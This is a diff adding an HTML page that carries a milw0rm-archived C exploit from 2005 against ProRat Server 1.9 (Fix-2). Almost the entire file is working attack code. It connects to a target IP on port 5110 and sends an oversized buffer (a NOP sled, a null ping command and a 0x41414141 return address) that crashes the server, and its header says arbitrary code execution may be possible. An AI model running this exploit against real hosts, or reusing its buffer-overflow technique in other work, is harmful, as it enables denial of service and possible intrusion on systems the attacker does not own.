@@ -1,0 +1,117 @@
+<html><head><title>ProRat Server <= 1.9 (Fix-2) Buffer Overflow Crash Exploit</title></head><pre>/* if this worked for you send me an email.
+ /str0ke */
+
+/******************************************************************************************
+
+	ProRat Server Buffer Overflow Crash POC
+	http://www.prorat.net/products.php?product=ProRat
+
+	Discovered and Coded by evil dabus
+	e-mail:	evil_dabus [at] yahoo.com
+
+	Tested on ProRat Server version 1.9 (Fix-2) Public Edition
+        on a Windows XP Professional sp2 operating system.
+
+	This exploit connects to the ProRat server (default port 5110) and sends
+        a long null command string.
+	After the exploit send, the ProRat Server will crash, trying to access
+	to a bad memory address: 0x41414141.
+        Remote users are able to  cause  the  server to  crash or potentially
+        execute arbitrary code.
+
+*******************************************************************************************/
+
+#include &lt;windows.h&gt;
+#include &lt;winsock.h&gt;
+#include &lt;stdio.h&gt;
+
+#define BUFSIZE                 0x280
+#define NOP                     0x90
+#define PORT                    5110                            // default port
+#define RET_ADDR                &quot;\x41\x41\x41\x41&quot;              // crash
+#define NULL_PING_COMMAND       &quot;\x30\x30\x30\x30\x30\x30&quot;
+
+void
+banner() {
+        printf(&quot;- ProRat v1.9:Fix-2 remote buffer overflow\n&quot;);
+	printf(&quot;- Coded by evil dabus (evil_dabus [at] yahoo.com)\n&quot;);
+}
+void
+usage(char *prog) {
+        banner();
+
+        printf(&quot;- Usage: %s &lt;target ip&gt; [target port]\n&quot;, prog);
+        printf(&quot;\n&quot;);
+
+        exit(1);
+}
+
+void
+main(int argc, char *argv[])
+{
+        WSADATA wsaData;
+        struct hostent *pTarget;
+        struct sockaddr_in sock;
+        SOCKET s;
+        int iPort = PORT;
+        char szRecvBuf[BUFSIZE+1];
+        char szExpBuff[BUFSIZE];
+
+        if (argc &lt; 2)   usage(argv[0]);
+        if (argc==3)    iPort = atoi(argv[2]);
+
+        printf(&quot;\n[+] Initialize windows sockets.&quot;);
+        if (WSAStartup(MAKEWORD(2,0), &amp;wsaData) &lt; 0) {
+                printf(&quot;\n[-] WSAStartup failed! Exiting...&quot;);
+                return;
+        }
+
+        printf(&quot;\n[+] Initialize socket.&quot;);
+        s = socket(AF_INET, SOCK_STREAM	, 0);
+        if(s == INVALID_SOCKET){
+                printf(&quot;\n[-] Error socket. Exiting...&quot;);
+                exit(1);
+        }
+
+        printf(&quot;\n[+] Resolving host info.&quot;);
+        if ((pTarget = gethostbyname(argv[1])) == NULL) {
+                printf(&quot;\n[-] Resolve of %s failed.&quot;, argv[1]);
+                exit(1);
+        }
+        memcpy(&amp;sock.sin_addr.s_addr, pTarget-&gt;h_addr, pTarget-&gt;h_length);
+        sock.sin_family = AF_INET;
+        sock.sin_port = htons(iPort);
+
+        printf(&quot;\n[+] Prepare exploit buffer... &quot;);
+        memset(szExpBuff,NOP,BUFSIZE);
+        memcpy(szExpBuff,NULL_PING_COMMAND,sizeof(NULL_PING_COMMAND)-1);
+        memcpy(szExpBuff+576,RET_ADDR,sizeof(RET_ADDR)-1);
+
+        printf(&quot;\n[+] Connecting to %s:%d ... &quot;, argv[1],iPort);
+        if ( (connect(s, (struct sockaddr *)&amp;sock, sizeof (sock) ))){
+                printf(&quot;\n[-] Sorry, cannot connect to %s:%d. Try again...&quot;, argv[1],iPort);
+                exit(1);
+        }
+
+        printf(&quot;\n[+] OK.&quot;);
+        if ( recv(s, szRecvBuf, BUFSIZE+1, 0) == 0 ) {
+                printf(&quot;\n[-] Error response server. Exiting...&quot;);
+                exit(1);
+        }
+
+        Sleep(1000);
+        printf(&quot;\n[+] Sending exploit buffer. size: %d&quot;,sizeof(szExpBuff));
+        if (send(s,szExpBuff, sizeof(szExpBuff)+1, 0) == -1){
+                printf(&quot;\n[-] Send failed. Exiting...&quot;);
+                exit(1);
+        }
+
+        Sleep(1000);
+        printf(&quot;\n[+] OK.\n&quot;);
+        printf(&quot;\n[*] Now try to connect to the server&quot;);
+
+        closesocket(s);
+        WSACleanup();
+}
+
+// milw0rm.com [2005-08-01]</pre></html>
